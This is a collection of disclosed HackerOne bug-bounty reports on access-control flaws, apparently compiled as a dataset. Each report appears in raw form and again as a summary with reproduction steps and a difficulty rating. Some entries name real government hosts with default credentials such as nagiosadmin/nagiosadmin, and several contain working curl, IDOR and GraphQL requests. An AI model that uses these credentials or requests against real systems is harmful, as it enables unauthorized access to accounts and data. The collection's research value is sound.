Vulnerability Description:
The vulnerability is an authentication bypass that allows unauthorized access to sensitive information by manipulating HTTP responses. By changing the response status code from '401 Unauthorized' to '200 OK', an attacker can gain access to restricted areas of the application without valid credentials.

Steps to Reproduce:
1. Navigate to the login page at 'https://████/harbor/sign-in' and attempt to log in with credentials 'admin:admin'.
2. Intercept the response using Burp Suite and modify the HTTP status code from '401 Unauthorized' to '200 OK' to bypass authentication.
Exploitation Difficulty:
The attack involves intercepting and modifying HTTP responses, which is a straightforward process with tools like Burp Suite. The vulnerability does not require understanding complex application states or novel logic, making it relatively easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1700896: access nagios dashboard using default credentials in ** omon1.fpki.gov, 3.220.248.203**
================================================================================
RAW DESCRIPTION:

Summary:
when i performing recon on fpki.gov i found nagios dashboard in omon1.fpki.gov, 3.220.248.203 and i accessed it using default credentials
username: nagiosadmin
password : nagiosadmin
Steps To Reproduce:
visit these urls : https://omon1.fpki.gov/nagios/side.php https://3.220.248.203/nagios/side.php
he will ask to put your credentials in basic authentication enter these credentials username: nagiosadmin password : nagiosadmin
POC:
look at poc pic
Impact
attacker can make any action like an admin he has full control on your panal.
thanks , have a nice day :)



================================================================================
Vulnerability Description:
The Nagios dashboard on omon1.fpki.gov and 3.220.248.203 was accessible using default credentials (nagiosadmin/nagiosadmin), allowing full administrative control over the panel.

Steps to Reproduce:
1. Visit the URLs: https://omon1.fpki.gov/nagios/side.php or https://3.220.248.203/nagios/side.php
2. Enter the default credentials when prompted (username: nagiosadmin, password: nagiosadmin)
Exploitation Difficulty:
The vulnerability involves no complex components or interactions. It is a straightforward case of default credentials being left unchanged, which is a common and well-known issue.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1714767: Upload and delete files in debug page without access control.
================================================================================
RAW DESCRIPTION:

I found a debug page with no access control that allows:
Uploading files.
Reading files if they are in JSON format.
Delete files.
Impact
Insufficient access control.
An attacker can delete files exposed by the application.
System Host(s)
████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
For upload file:
Use a browser to navigate to: https://█████/debug.
Click on choose file button.
Set the file path in the location field
Click on the upload files button. 5.See the file uploaded on the list.
For Read File
Select the file.
Click and Read File Content.
See the content file.
For delete file:
Select the file.
Click on the Delete ENC Files button.
Suggested Mitigation/Remediation Actions
Implement access control on the page.



================================================================================
Vulnerability Description:
A debug page lacks access control, allowing unauthorized users to upload, read (if JSON), and delete files, leading to potential data exposure or loss.

Steps to Reproduce:
1. Navigate to https://█████/debug in a browser
2. Click on 'Choose File', select a file, and click 'Upload Files'
3. Select the uploaded file and click 'Read File Content' to view its contents
4. Select the file and click 'Delete ENC Files' to remove it
Exploitation Difficulty:
The vulnerability involves straightforward interactions with a debug page without any complex state manipulation or novel logic. The steps are simple and do not require understanding of subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1806387: Accessing unauthorized administration pages and seeing admin password - speakerkit.state.gov
================================================================================
RAW DESCRIPTION:

Summary:
I discovered an issue referred to as no-redirect in a subdomain on state.gov. When you enter the page, it directs you directly to the entrance. When I examined it via burp suite, it gave 302 found, but the homepage data was showing below. When I tried it as admin, it still gave 302 found, but this time we could see the content of the admin page. this way i was able to see admin user and normal user's info. I was also able to perform many transactions. uploading files, adding categories and many more.
Steps To Reproduce:
1- Login to https://speakerkit.state.gov/
and it will throw you to the page named "spklogin". Using the find and replace feature on burpsuite, I told it to change all requests that gave 302 found to 200 Ok, and I easily performed my operations. You will be able to do it when you watch the video.
Supporting Material/References:
https://hackerone.com/reports/1026146
https://hackerone.com/reports/95441
[attachment / reference]
<image_0>
[ poc / video] ████████
Impact
access the admin page. unauthorized.



================================================================================
Vulnerability Description:
The vulnerability involves an improper redirect handling issue where modifying the HTTP response code from 302 Found to 200 OK exposes the admin page content, allowing unauthorized access to sensitive information and administrative functions.

Steps to Reproduce:
1. Access https://speakerkit.state.gov/ and observe the redirect to 'spklogin'.
2. Use Burp Suite to intercept the request and modify the HTTP response code from 302 Found to 200 OK, revealing the admin page content.
Exploitation Difficulty:
The attack requires understanding of HTTP response codes and the use of a tool like Burp Suite to manipulate them. However, the steps are straightforward once the initial redirect behavior is observed and the tool is employed.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1903322: Improper Access Control + Financial fraud allows attacker to disclose + add arbitrary products to another's user's order 
================================================================================
RAW DESCRIPTION:

Context
The [██████) website allows users to place orders and modify them after they were placed.
To modify an order after it was placed, it must be in a state before the shopping is in progress. This allows customers to adjust an order before its final shipment
Vulnerability
It is possible to add arbitrary products to another's user's order before it was placed. By sending the proper HTTP request, the content of the target order is also disclosed, including the victim user's physical address.
Steps to reproduce
Place two distinct orders, with two different accounts. To simplify the process, place them in the same shop and place the order in the future.
For this Proof-of-Concept, the technical values were the following :
Key	Value
Attacker e-mail	██████
Victim e-mail	███
Attacker order ID	1813918441
Victim order ID	181396149
For the sake of simplicity, the adress was set to ███████ and the shop was CVS ("store":{"store_id":60,"store_location_id":29244,"metro_id":210,"name":"CVS")
Once the orders are placed, proceed to step two.
For both orders, add a new item to the placed order. An HTTP POST request similar to the one below will be sent :
Code 993 Bytes
1POST /aviator/v2/orders/1813918441/add.json?anonymous_id███deac090c-2b05-4402-b33f-468060058145█████white_label_key████████shipt████████segway_version██████6668a3d631495cebf307423e23a588c5f9d929c1████zip█████████████user_id█████████████████████████metro_id█████████124███████store_id████████60██████bucket_number██████72███store_location_id██████████platform████████web HTTP/2
2Host: ███████
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/███████ Firefox/110.0
4Accept: application/json, text/plain, */*
5Accept-Language: fr,fr-FR;q████████0.8,en-US;q█████0.5,en;q████████0.3
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Content-Length: 154
9Referer: ██████
10Origin: █████████
11Sec-Fetch-Dest: empty
12Sec-Fetch-Mode: cors
13Sec-Fetch-Site: same-site
14X-Pwnfox-Color: blue
15Authorization: ██████████
16Te: trailers
17
18{"zip":"████","user_id":█████,"metro_id":124,"store_id":60,"bucket_number":72,"store_location_id":██████,"products":[{"id":4799771,"qty":1,"note":""}]}
To perform the exploit, simply replace the order number in the URL with the order number of your victim. For instance here :
/aviator/v2/orders/1813918441/add.json -- > becomes --> /aviator/v2/orders/181396149/add.json
The server will indeed add the selected products in the victim's cart and additionnally disclose the content of the cart and the customer's e-mail address :
████████
Additionnally, by targeting other orders numbers, it is possible to disclose the status of orders numbers. For example :
An order cannot be updated because shopping is in progress
Could not retrieve product info (if the shop is different)
Impact
The vulnerability described here has significant impacts on both the customers and the company, as it involves the manipulation of orders and the exposure of sensitive customer information.
Indeed, the exploit both discloses user's physical address as well as having them billed for unwanted items.
However the business impacts of the vulnerability can go quite beyond this scope. Indeed, customers who fall victim to the attack will be billed for unwanted items, leading to financial loss for them. Additionally, the company may have to issue refunds or compensate customers, resulting in financial losses for the company. Similarly, this could also impact the smooth running of deliveries from an operational point of view.
From a reputational perspective, customers who have been affected by the attack may lose trust in the company and its ability to protect their personal and financial information. This could result in negative reviews, decreased sales, and a damaged reputation for the company.
For the physical address, this also adds addtional personal safety concerns.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to add arbitrary products to another user's order and disclose sensitive information such as the victim's physical address and email by manipulating the order ID in an HTTP request.

Steps to Reproduce:
1. Place two distinct orders with two different accounts in the same shop, scheduled for the future.
2. Modify one of the orders by sending an HTTP POST request to add an item, then replace the order ID in the URL with the victim's order ID to add items to their order and disclose their cart contents and email address.
Exploitation Difficulty:
The attack involves manipulating order IDs in HTTP requests, which is a straightforward process once the structure of the request is understood. However, it requires the attacker to know or guess valid order IDs, which adds a layer of complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1914115: End-to-end encrypted file-drops can be made inaccessible
================================================================================
RAW DESCRIPTION:

Assume a filedrop that is send to 2 people, USER and ATTACKER
user uploads their E2EE encrypted fileA into the filedrop
All goes well
Now ATTACKER comes along and wants mess up the upload from USER
They obtain the metadatafile
They modify the entry in the filedrop list that USER created
They upload their new metadatafile
Unlock it
FileA is now not able to be decoded at all anymore.
Impact
The CIA model (Confidentiality, integrity and availability) is here very easy to break. An attacker can almost trivially in this case break the availability.
Note that due to the nature of providing the metadatafile an attacker can trivially know if there are other filedrop files.
To solve
Do not provide the metadata file to the user in file drop at all
Only send back the new entry (which they can create without the metadatafile)
Append the new entry in the backend code.



================================================================================
Vulnerability Description:
An attacker can disrupt the availability of an end-to-end encrypted file in a filedrop by modifying the metadata file, making the original file undecodable. This breaks the CIA triad's availability aspect.

Steps to Reproduce:
1. USER uploads an E2EE encrypted file (fileA) into the filedrop.
2. ATTACKER obtains the metadata file, modifies the entry in the filedrop list created by USER, and uploads the modified metadata file.
3. ATTACKER unlocks the modified metadata file, rendering fileA inaccessible for decoding.
Exploitation Difficulty:
The attack involves understanding the metadata file's role in the filedrop system and how modifying it affects file accessibility. However, the steps are straightforward once the metadata file's purpose is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1960107: Rider can forcefully get passenger's order accepted resulting in multiple impacts including PII reveal  and more mentioned in the report.
================================================================================
RAW DESCRIPTION:

Summary:
Hello Indrive Security Team,
This is going to be chain of attacks with major flow being in /api/setTenderStatus request allowing the attacker to get their ride request accepted automatically.
Steps To Reproduce:
1st major vulnerability:
// Forcefully getting the passenger to accept the ride
Section 1
Whenever a rider/driver offers the passenger their price there is a request that is sent to /api/driverrequest
█████
Now after getting the tenderID and OrderID from that request, the rider sends the request in /api/setTenderStatus in this format
█████████
Here the orderID and tenderID is from step 1.
The ride gets accepted.
The impact for this is "The rider can get details of any passenger, this includes phone number of passengers. Even when the passenger doesn't accept the riders offer."
Please keep in mind that this can be automated in real time to make this attack more efficien.
2nd Chain vulnerability:
// Chose a out of range price
Section 2
This request is sent when the rider bids his price:
██████████
The rider can modify the price range to be of a much higher value than that.
Resulting in sending a bid that is significantly more
// Combining this with above vulnerability we can get passenger to forcefully accept the ride of the customer.
Provide the request in curl format, if possible
For vuln A:
Code 192 Bytes
1curl https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept
For vuln B:
Code 361 Bytes
1curl https://terra-akamai.indriverapp.com/api/driverrequest?cid=5957&locale=en_US&job_id=338f72ff-f3c1-4da0-af15-5d1aa720146b&phone=██████████&token=████████&v=7&stream_id=1682279074257167&order_id=██████&client_id=█████████&shield_session_id=██████████&type=indriver&price=63&period=3&geo_arrival_time=1&distance=5&longitude=85.3249627&latitude=27.7390611&sn=1
Thank you so much.
Let me know if you need any further help in reproducing this issue.
@spongebhav
Impact
Revealing PII of customers even if customer didn't accept the rider's request.
Making customer accept a bid that is significantly higher tricking the customer into giving more money.



================================================================================
Vulnerability Description:
This vulnerability allows a rider to forcefully accept a passenger's ride request without their consent, leading to unauthorized access to the passenger's PII (such as phone number) and potential financial fraud by manipulating the bid price.

Steps to Reproduce:
1. Intercept the tenderID and orderID from the /api/driverrequest endpoint when a rider/driver offers a price to a passenger.
2. Use the intercepted tenderID and orderID to send a request to /api/setTenderStatus with status=accept, forcing the passenger to accept the ride without their consent.
3. Optionally, manipulate the price parameter in the /api/driverrequest endpoint to submit a bid significantly higher than the allowed range.
4. Combine the forced acceptance with the manipulated price to trick the passenger into paying more than intended.
Exploitation Difficulty:
The attack involves multiple components (intercepting IDs, manipulating API requests, and combining vulnerabilities) and requires understanding the application's flow and state. However, the steps are relatively straightforward once the API endpoints and parameters are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1991214: Automatic Admin Access
================================================================================
RAW DESCRIPTION:

URL: https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::
When visiting the following URL, the user is automatically signed into a user with administrative access.
███
This user is allowed to:
Create new submissions, allowing file uploads
████████
See all submissions going back to 2012
██████████
Manage users - add, delete, and link users. This user could also add the Administrator role to a user.
███
████
Send spam emails to all users
█████████
Access admin tools like publishing data and removing publications
██████████
I did not test all functionality provided by this access as I did not want to damage the integrity of the data on the web application.
Please let me know if you would like me to test adding/deleting users, creating submissions and testing file upload vulnerabilities, etc. This would also allow me to demonstrate the severity of this vulnerability as well as find new vulnerabilities in the application. For example, with permission I would like to test the file upload functionality for vulnerabilities.
Impact
This is a critical vulnerability. This impacts the integrity, confidentiality, and availability of the application.
Integrity: Unauthorized users can upload arbitrary data, publish data, and delete publications.
Confidentiality: This exposes names, emails, and submissions.
Availability: This administrative user can delete other user accounts, denying them access.
System Host(s)
███████.mil
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Visiting URL: https://███.mil/apexcrrel/f?p=150:24:23467499301323::NO:::
View active user in top right corner: "ben auto log user". This user is an administrator.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The vulnerability allows any visitor to automatically gain administrative access to the application by visiting a specific URL. This grants unauthorized users the ability to perform critical administrative actions such as managing users, uploading files, accessing sensitive data, and modifying application content.

Steps to Reproduce:
1. Visit the URL: https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::
2. Observe that the user is automatically signed in as an administrative user ('ben auto log user') with full admin privileges
Exploitation Difficulty:
The attack involves no complex steps or interactions—merely visiting a URL triggers the automatic admin access. There is no need for authentication bypass techniques, session manipulation, or understanding of complex application logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1991290: Endpoint Redirects to Admin Page and Provides Admin role
================================================================================
RAW DESCRIPTION:

Summary:
By navigating to https://████████.mil/apexcrrel/f?p=165:56, the user will automatically be redirected to the web application admin portal with Admin access.
Description:
There is a web application running at the following URL:
https://█████.mil/apexcrrel/f?p=165:1::::::
████
For context, this is a web application running on a Oracle Apex Express platform. The '165' in the 'p' parameter in the URL is a unique identifier for the web application. The '1' following the '165' represents the page that the user is viewing.
The page '56' can be used to automatically obtain administrator access to this application.
Here we can see that we can't access the 45th page (https://████.mil/apexcrrel/f?p=165:45) because we are not an Admin.
███████
However, navigating to the 56th page (https://██████████.mil/apexcrrel/f?p=165:56) automatically redirects to the 45th page but provides a valid admin session.
█████████
We can also see that we have the ability to manage users, including admin users.
██████████
As a note, I found this due to the application at https://████.mil/apexcrrel/f?p=164:5::::::
This is a separate web application, given that the unique identifier is now 164.
On this page there is a 'Go To Admin' button. When clicking this, it calls the /apexcrrel/DISDI_PORTAL_DEV.login_admin endpoint. This redirects the user to the 56th page, breaking the access control and providing Admin access.
███████
Impact
This is a critical severity bug that impacts confidentiality, integrity, and availability.
Confidentiality: An attacker can obtain first names, last names, email addresses, and filenames of uploaded files.
Integrity: An attacker can upload files, edit documents, and edit user roles
Availability: An attacker could remove all users, including admins, making it difficult for users to use the application.
System Host(s)
█████.mil
Affected Product(s) and Version(s)
Oracle Apex Express
CVE Numbers
Steps to Reproduce
To verify that you do not have any valid sessions to view the admin pages, visit https://██████.mil/apexcrrel/f?p=165:45
Now, navigate to https://█████████.mil/apexcrrel/f?p=165:56
You now have admin access to the application.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
A web application running on Oracle Apex Express has an authentication bypass vulnerability where accessing a specific page (56) grants admin privileges without proper authorization, allowing unauthorized access to sensitive data and administrative functions.

Steps to Reproduce:
1. Navigate to https://██████.mil/apexcrrel/f?p=165:45 to verify no admin access
2. Access https://█████████.mil/apexcrrel/f?p=165:56 to gain admin privileges
Exploitation Difficulty:
The vulnerability involves a simple URL manipulation to bypass authentication controls. The attack does not require understanding complex interactions or states, nor does it involve novel logic. The discovery was straightforward once the tester identified the pattern in the URL structure.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2190808: User automatically logged in as Sys Admin user on https://███/Administration/Administration.aspx
================================================================================
RAW DESCRIPTION:

Description:
Any user can access the Administration section of the following URL: https://███
When the user goes to the following domain they are automatically logged in as "████████" which is a sys admin user on the application, this allows any user to upload files, add users, change permissions for users and delete users.
References
Impact
A malicious actor can modify other user's privileges on the application, add users, upload files, delete users. They can also add false information to the application which will jeopardize the integrity of the application. With administrator privileges they have no restrictions on the application.
System Host(s)
https://█████████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Step 1) Go to the following URL: https://███
There you will se that you are logged in as a Sys Admin user
Suggested Mitigation/Remediation Actions
The application should prompt a user to authenticate first before being able to do any other actions on the system.



================================================================================
Vulnerability Description:
The application automatically logs in any user as a sys admin when accessing the administration URL, allowing unauthorized users to perform administrative actions such as uploading files, adding users, changing permissions, and deleting users.

Steps to Reproduce:
1. Navigate to the URL: https://███/Administration/Administration.aspx
Exploitation Difficulty:
The vulnerability is straightforward to discover as it requires no complex interactions or manipulations of the application state. The issue is immediately apparent upon accessing the administration URL without any authentication.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2212627: Delete external storage of any user
================================================================================
RAW DESCRIPTION:

A security vulnerability was uncovered that allowed standard users to remove external storage resources from any user account in the application. This flaw was particularly concerning because it enabled unauthorized users to delete these resources based on a system-generated ID, which automatically incremented, without requiring any special privileges. This issue didn't grant access to the data but allowed for the indiscriminate removal of external storage associated with user accounts, potentially leading to data loss and disruption of service for affected users.
Reproduction Steps:
1.Begin by logging in with a standard user account and establish an external storage connection.
2. Afterward, update the storage configuration. Observe that the following request is generated:
Code 462 Bytes
1PUT /apps/files_external/userstorages/<storage_id> HTTP/1.1
2Host: 127.0.0.1:9090
3[REDACTED]
4
5{"mountPoint":"simpleuser","backend":"owncloud","authMechanism":"password::logincredentials","backendOptions":{"host":"cq6xxrdnw1941wu9jk4gcyfuglmfa4.oastify.com","root":"","secure":true},"testOnly":true,"id":<storage_id>,"mountOptions":{"enable_sharing":true,"encoding_compatibility":false,"encrypt":true,"filesystem_check_changes":1,"previews":true,"readonly":false}}
3.Next, log in to the application with an administrative user account or any other role and establish a storage connection.
4.Observe that each new storage created increments the ID automatically. For instance, it could become 28.
5. Using the standard user role, issue the request once more to modify the ID linked to the administrative storage. Observe that this action leads to the removal of the storage from the administrator's account.
Impact
This finding has a huge impact on the application, including data loss, service disruption, unauthorized actions, data privacy concerns, security risks, and potential reputation damage.



================================================================================
Vulnerability Description:
A security vulnerability allows standard users to delete external storage resources from any user account in the application by exploiting an auto-incremented ID system. This flaw enables unauthorized users to remove storage resources without special privileges, potentially causing data loss and service disruption.

Steps to Reproduce:
1. Log in with a standard user account and establish an external storage connection.
2. Update the storage configuration and observe the generated request.
3. Log in with an administrative user account and establish another storage connection.
4. Observe the auto-incremented ID of the new storage (e.g., 28).
5. Using the standard user role, issue the same request to modify the ID linked to the administrative storage, leading to its removal.
Exploitation Difficulty:
The vulnerability involves understanding the auto-incremented ID system and manipulating it to target other users' storage. While the steps are straightforward, the interaction between user roles and the ID system is subtle but not highly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/223434: Improper access control when an added email address is deleted from authentication
================================================================================
RAW DESCRIPTION:

Hi team,
There is improper access control kind of vulnerability present in your web application.
Steps to reproduce:
Create an account. 2.You will recevie a link on email about confrimation.
Login into it and add another email address in authentication tab and You will recevie a link on the new email about confrimation. 3.Remove the the any email address from it authentication tab. (Suppose your old email address got lost or hacked).
Now suppose I removed old email address from authentication tab because i doubt the my old email id got hacked.
Logically when user click on the link recived in the step 2 the user should not be allowed to enter in the application because we have removed the email from authentication tab.
When attacker click on the old link recieved in the step 2 will be able to login into the application and the old email id will be automatically added to authentication tab in that account even the we have alredy removed that email address from our account.
Please let me know if anything more is required .!



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to regain access to an account by using an old email confirmation link, even after the associated email address has been removed from the authentication tab. This happens because the system fails to invalidate old confirmation links and automatically re-adds the email address upon link usage.

Steps to Reproduce:
1. Create an account and confirm it via the email link received.
2. Add another email address in the authentication tab and confirm it via the new email link received.
3. Remove the old email address from the authentication tab.
4. Click on the old confirmation link received in step 2. The attacker can now log in, and the old email address is automatically re-added to the authentication tab.
Exploitation Difficulty:
The attack involves multiple steps, including account creation, email confirmation, and email removal, but the interaction between these steps is relatively straightforward. The vulnerability arises from a logical flaw in how the system handles old confirmation links and email address management, which is not overly complex or novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2262365: Default Admin Username and Password on ███
================================================================================
RAW DESCRIPTION:

It is possible to access the application is using the default username and password
Steps To Reproduce:
1-Go to https://███/geoportal/ and login with credentials:
user and password: admin
user and password: gptadmin
Poc video attached
Impact
A Department of Defense website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials and delete posts , edit website
System Host(s)
███
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
POC video
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The application is using default admin credentials (username and password: admin, username and password: gptadmin), which allows unauthorized access to administrative functions, including the ability to delete posts and edit the website.

Steps to Reproduce:
1. Go to https://███/geoportal/
2. Attempt to log in using the default credentials: username 'admin' and password 'admin' or username 'gptadmin' and password 'gptadmin'
Exploitation Difficulty:
The vulnerability involves a straightforward attack vector—using default credentials—which is a common and well-documented issue. There are no complex interactions or states involved, and the attack does not require any novel logic or multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2312029: View Titles of Private Reports with pending email invitation
================================================================================
RAW DESCRIPTION:

Summary:
If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.
Description:
Steps To Reproduce
As victim:
In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
Save the integer ID of the report.
In a new, anonymous/unauthenticated/logged-out session:
Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
Code 50 Bytes
1{
2  report(id:IPRIVATE_REPORT_ID){
3    title
4  }
5}
OR run JS implementation:
By visiting hackerone.com/hacktivity as anonymous:
Code 669 Bytes
1const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
2const REPORT_ID = PRIVATE_REPORT_ID // integer
3
4var resp = await(await fetch("https://hackerone.com/graphql", {
5  "headers": {
6    "accept": "*/*",
7    "content-type": "application/json",
8    "x-csrf-token": csrf_token,
9  },
10  "body": JSON.stringify({
11    "operationName": "HacktivitySearchQuery",
12    "variables": {
13        "reportId": REPORT_ID
14    },
15    "query": `query HacktivitySearchQuery($reportId: Int!) {
16  report(id: $reportId){
17    id
18    url
19    title
20  }
21}
22`
23}),
24  "method": "POST",
25  "mode": "cors",
26  "credentials": "include"
27})).json()
28console.log(resp.data.report)
The title of the report is the response, confirming the vulnerability.
Impact
Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.



================================================================================
Vulnerability Description:
An anonymous user can view the title of a private report if it has a pending email invitation for collaboration. This information disclosure vulnerability occurs only when the collaboration invitation is pending and the user is unauthenticated.

Steps to Reproduce:
1. As a victim, add a collaborator to a private report using any email via the Manage Collaborators invitation panel and save the report ID.
2. As an anonymous user, send a GraphQL request with the saved report ID to retrieve the title of the private report.
Exploitation Difficulty:
The vulnerability involves understanding the interaction between pending collaboration invitations and GraphQL access controls. While the steps are straightforward, the requirement for a pending invitation adds a specific condition that must be met for the vulnerability to be exploitable.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2342461: Improper Access Controls(Admin Path)
================================================================================
RAW DESCRIPTION:

Summary:
Go to https://nin.mtn.ng/ then click on "Check your NIN Link Status" then right click and click on "Inpect" and admin path is display at web browser ../wp-admin/admin-ajax.html
Steps To Reproduce:
<image_0>
<image_1>
<image_2>
Impact
1.) View Sensitive Information
2.) Steal Customers details
3.) Install backdoor
4.) Access different Components
5.) Alter System



================================================================================
Vulnerability Description:
The vulnerability involves improper access controls where an admin path is exposed through simple inspection of the webpage. This can lead to unauthorized access to sensitive information, customer details theft, backdoor installation, and system alteration.

Steps to Reproduce:
1. Go to https://nin.mtn.ng/
2. Right-click on 'Check your NIN Link Status' and select 'Inspect' to reveal the admin path '../wp-admin/admin-ajax.html' in the browser
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires inspecting the webpage, which is a common practice among testers. There are no complex interactions or states involved, and the method of discovery is not novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2442229: Missing Access Control Allows for User Creation and Privilege Escalation 
================================================================================
RAW DESCRIPTION:

Hello,
The RSI Test Environment application at https://███████████████/ords/f?p=842:1 does not enforce access controls on the user management endpoint. This allows any unauthenticated person to both create new users as well as give them the administrator role. This then provides access to https://███████████████/ords/f?p=303 as an administrator.
The user management endpoint can be accessed at https://████████████/ords/f?p=842:9::::::
I have attached screenshots which show this misconfiguration.
If there are any questions or concerns please let me know as I am more than happy to provide additional information!
Impact
This is a critical security issue which poses risk to the confidentiality and integrity of data within the ███████████████ application. An attacker would be able to view, modify, and/or delete the restricted information and documents within the application as well as manage other user accounts. This provides unauthorized access that is otherwise restricted to USG-authorized individuals per the disclaimer.
System Host(s)
█████████████████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Visit https://█████████████████/ords/f?p=842:9, which is the user management endpoint for the environment.
Under "Add New User", enter an email address, first name, last name, and select an Agency.
Under "Assign User Roles", select the newly created user and apply the administrator role.
Retrieve the credentials for the new account that were sent to the email address entered.
Go to https://███████████/ords/f?p=303 and login using the credentials.
Change to a new password on prompt.
View the logged in username in the top right with the Administrator role.
Suggested Mitigation/Remediation Actions
Enforce access controls on page 9 of the application with an ID of 842.



================================================================================
Vulnerability Description:
The RSI Test Environment application does not enforce access controls on the user management endpoint, allowing any unauthenticated person to create new users and assign them the administrator role. This provides unauthorized access to restricted information and documents within the application.

Steps to Reproduce:
1. Visit the user management endpoint at https://█████████████████/ords/f?p=842:9
2. Under 'Add New User', enter an email address, first name, last name, and select an Agency
3. Under 'Assign User Roles', select the newly created user and apply the administrator role
4. Retrieve the credentials for the new account that were sent to the email address entered
5. Go to https://███████████/ords/f?p=303 and login using the credentials
6. Change to a new password on prompt
7. View the logged in username in the top right with the Administrator role
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of missing access controls on a user management endpoint. The steps to reproduce are linear and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/247225: Session Duplication due to Broken Access Control
================================================================================
RAW DESCRIPTION:

Due to improper validation of user before generating an API-KEY and improper measures taken at the time of password reset, it is possible to generate a parallel session at the attacker's end.
Proof of concept video is attached to confirm the vulnerability and to demonstrate the Impact of this logical bug.
Steps to Reproduce
Attacker
Create an account with victims email.
Download the coding platforms and get API-KEY.
He can code from the platforms using the victims API-key.
Victim
User fails to create an account, due to email already registered and does a password reset.
Downloads the coding platform and get API-KEY.
He codes using API-KEY.
It is possible for the Attacker and Victim, for coding at the same time, which will be shown at the dashboard. Attacker can reduce the difficulty and can damage the reputation of the coder.
Impact
Attacker can brute-force email and register multiple account on wakatime to get API-Key of many users.
Improper rank calculation.
Session duplication by the attacker



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to create a parallel session by registering with the victim's email, obtaining an API-KEY, and then using it alongside the victim. This occurs due to improper validation during account creation and password reset processes, leading to session duplication and potential reputation damage.

Steps to Reproduce:
1. Attacker creates an account using the victim's email address.
2. Attacker downloads the coding platform and obtains the API-KEY.
3. Attacker uses the victim's API-KEY to code on the platform.
4. Victim attempts to create an account but fails due to email already being registered.
5. Victim performs a password reset and downloads the coding platform to obtain their API-KEY.
6. Both attacker and victim can code simultaneously using the same API-KEY, leading to session duplication.
Exploitation Difficulty:
The attack involves multiple components (account creation, API-KEY generation, password reset) and requires understanding the interaction between these components. However, the steps are relatively straightforward once the initial flaw (improper email validation) is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2513082: Program Member Could Duplicate Report To A Non Related Program Original Report 
================================================================================
RAW DESCRIPTION:

Summary:
Hello Hackerone team, I found a vulnerability on setting duplicate report as program owner. I'm able to duplicate a report to a report that doesn't have relation with the program. For example we can duplicate to a public report in hacktivity.
Steps To Reproduce
Create a sandbox program
On a report, select closed as duplicate and select another report from your program
<image_0>
<image_1>
Impact
A Program could mark as duplicate a report that even doesn't have correlation to the original report and security researcher wouldn't be able to validate it
Integrity issue since the duplicate report should be only come from the program related report



================================================================================
Vulnerability Description:
A program owner can mark a report as a duplicate of another report from an unrelated program, which should not be allowed. This misleads security researchers and affects the integrity of the reporting system.

Steps to Reproduce:
1. Create a sandbox program.
2. On a report, select 'closed as duplicate' and choose another report from a different program (e.g., a public report in hacktivity).
Exploitation Difficulty:
The vulnerability involves a straightforward action (selecting 'closed as duplicate') but requires the tester to recognize the improper validation of report relationships. The interaction is subtle but not highly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2516250: Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports
================================================================================
RAW DESCRIPTION:

Summary:
Hi there, I hope you are doing well :)
I found a vulnerability which allows me to close a report as duplicate of another program report. This can cause problems in various ways, i will include some of them and rest needs to be verified on Hackerone side what additional impact it can cause and its root cause analysis.
Steps To Reproduce
Create a Sandbox program
Invite a user with Report and Engagement access
Accept invitation from User B and login
Check any report and select option to Close Report as duplicate and this will be the HTTP request:
Code 993 Bytes
1
2POST /reports/bulk HTTP/2
3Host: hackerone.com
4Cookie: <USER B Cookies>
5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
6Accept: */*
7Accept-Language: en-US,en;q=0.5
8Accept-Encoding: gzip, deflate, br
9Referer: https://hackerone.com/reports/2424755
10X-Csrf-Token: <USER B CSRF TOKEN>
11Content-Type: application/x-www-form-urlencoded; charset=UTF-8
12X-Requested-With: XMLHttpRequest
13X-Datadog-Origin: rum
14X-Datadog-Parent-Id: 2173163794632761452
15X-Datadog-Sampling-Priority: 1
16X-Datadog-Trace-Id: 3844362884923386826
